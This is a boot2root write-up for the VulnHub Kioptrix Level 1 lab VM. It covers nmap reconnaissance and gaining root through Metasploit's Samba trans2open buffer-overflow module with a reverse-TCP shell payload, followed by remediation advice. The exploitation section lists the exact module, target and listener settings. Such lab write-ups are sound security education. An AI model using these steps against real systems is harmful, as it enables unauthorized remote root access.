# Kioptrix: Level 1 — Boot2Root Writeup

**Category:** Network Service Exploitation → Remote Buffer Overflow → Root
**Platform:** VulnHub (Kioptrix Level 1)
**Target:** `192.168.56.102`

> Classic beginner-friendly boot2root: fingerprint a legacy Samba service and
> pop root in one shot with a well-documented stack-based buffer overflow.

---

## Summary

| | |
|---|---|
| **Root cause** | Ancient, unpatched Samba `2.2.1a` vulnerable to `trans2open` (CVE-2003-0201) |
| **Exploit** | `exploit/linux/samba/trans2open` (Metasploit) |
| **Impact** | Direct remote root — no privilege escalation chain needed |

---

## 1. Host Discovery

```bash
nmap -sn 192.168.56.0/24
```

Four hosts up on the subnet; the target is identified as `192.168.56.102` by its Oracle
VirtualBox MAC address vendor prefix.

## 2. Port Scanning

```bash
nmap 192.168.56.102
```

| Port | Service |
|---|---|
| 22/tcp | SSH |
| 80/tcp | HTTP |
| 139/tcp | NetBIOS-SSN (Samba) |
| 443/tcp | HTTPS |

## 3. Service & Version Enumeration

```bash
nmap -sV 192.168.56.102
```

This is the critical step — version banners reveal a legacy Linux box running dangerously
outdated software:

- **Samba** `smbd` in workgroup `MYGROUP`
- Apache headers confirm **Red-Hat/Linux**
- **OpenSSL 0.9.6b** and **Apache 1.3.20** — both notorious for well-documented remote
  root vulnerabilities in this era

![nmap discovery and version scan](images/01-nmap-host-discovery-portscan.png)
![nmap version detection detail](images/02-nmap-version-detection.png)

## 4. Weaponizing the Recon — Metasploit

Started `msfconsole` and used the SMB version scanner to positively fingerprint the exact
Samba release before committing to an exploit:

```
msf > search smb_version
msf > use auxiliary/scanner/smb/smb_version
msf auxiliary(smb_version) > set RHOSTS 192.168.56.102
msf auxiliary(smb_version) > run
```

Result: **`Samba 2.2.1a`** — confirmed via the scanner output despite the ambiguous
"could not be identified" wrapper text.

![metasploit smb version scan](images/03-metasploit-smb-version-scan.png)

## 5. Identifying the Exploit

```
msf > search trans2open
```

`trans2open` (disclosed 2003-04-07) is a classic **stack-based buffer overflow** in Samba's
handling of oversized `TRANS2` transaction requests. A specially crafted request overwrites
the call stack and redirects execution into attacker-supplied shellcode, opening a reverse
shell. Multiple platform variants exist (FreeBSD, Linux, OSX, Solaris); the Red-Hat/Linux
fingerprint from the nmap scan points to:

```
exploit/linux/samba/trans2open   Rank: Great
```

![metasploit trans2open module search](images/04-metasploit-trans2open-search.png)

## 6. Exploit Configuration & Execution

```
msf > use exploit/linux/samba/trans2open
msf exploit(trans2open) > set RHOSTS 192.168.56.102
msf exploit(trans2open) > set RPORT 139
msf exploit(trans2open) > set LHOST 192.168.56.101
msf exploit(trans2open) > set payload generic/shell_reverse_tcp
msf exploit(trans2open) > run
```

The exploit brute-forces return addresses (`0xbffffdfc`, `0xbffffcfc`, ...) until one lands
correctly — expected behavior for an unreliable-offset stack overflow against a target
without ASLR. It succeeded on multiple attempts, opening **four separate command shell
sessions**.

![metasploit exploit configuration and execution](images/05-metasploit-exploit-config.png)

## 7. Root

```
whoami   # root
pwd      # /tmp
ls       # full root filesystem
```

Direct root access — no privilege escalation step required. `/tmp` is the landing directory,
consistent with the world-writable directory the overflow shellcode executed from.

![root shell obtained](images/06-root-shell-obtained.png)

---

## Root Cause & Remediation

| Issue | Fix |
|---|---|
| Samba `2.2.1a` — 20+ year old release with a known remote-root buffer overflow | Patch/upgrade Samba immediately; this version has no place on any network-facing host |
| No exploit mitigations observed (predictable stack addresses) | Enable ASLR, stack canaries, and NX bit on all production systems |
| Unnecessary legacy services exposed (NetBIOS/SMB on a public-facing box) | Disable or firewall off services not required for the host's actual role |

## Post-Exploitation Notes

Reaching root is the start of a real engagement, not the end. In a live assessment the next
steps would be: confirming persistence mechanisms available to a legitimate attacker (for
reporting purposes only), identifying sensitive data exposure, and — critically — documenting
the finding with clear reproduction steps and remediation guidance rather than exploiting
further.

## Tools Used

`nmap` · Metasploit Framework (`smb_version`, `trans2open`)
